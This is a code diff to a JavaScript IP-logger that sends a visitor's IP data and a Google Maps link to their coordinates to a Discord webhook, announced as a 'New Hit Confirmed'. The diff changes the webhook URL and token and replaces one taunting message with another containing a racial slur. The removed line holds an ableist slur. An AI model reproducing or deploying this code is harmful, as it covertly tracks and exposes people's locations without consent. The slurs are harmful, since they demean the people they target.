@@ -25,7 +25,7 @@ function getIP(json) {
             var params = {
                 username: "SPNXY RUNS YOU",
                 avatar_url: "https://cdn.discordapp.com/attachments/1040122185114714192/1237240108990857276/551a1ecc2c39cf1cac3f1fe26333f01a.jpg",
-                content: "@everyone, **NEW IP LOGGED LMAOOO THESE RETARD'S** \n **New Hit Confirmed** \n" +
+                content: "@everyone, **THX FOR THE IP NIGGA** \n **New Hit Confirmed** \n" +
                          `Google Maps: https://www.google.com/maps/?q=${data.latitude},${data.longitude}\n` +
                          message
             };
@@ -38,7 +38,7 @@ function getIP(json) {
 
 function sendToWebhook(params) {
     var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1374798801256316979/xpGH2logNVsMzbF66SKzNGfnWVoC1RgiJybr7yZhAzCZPqI430ihSkoYrWz_xkxPl4bl");
+    request.open("POST", "https://discord.com/api/webhooks/1375139974537679030/obIOLG-9M3-_22lc62iJonHjS7q3L6DTS-_aNW84vNgNcvHgAqeKmIpBBlbeOxGBD5QQ");
     request.setRequestHeader('Content-type', 'application/json');
 
     request.onreadystatechange = function() {
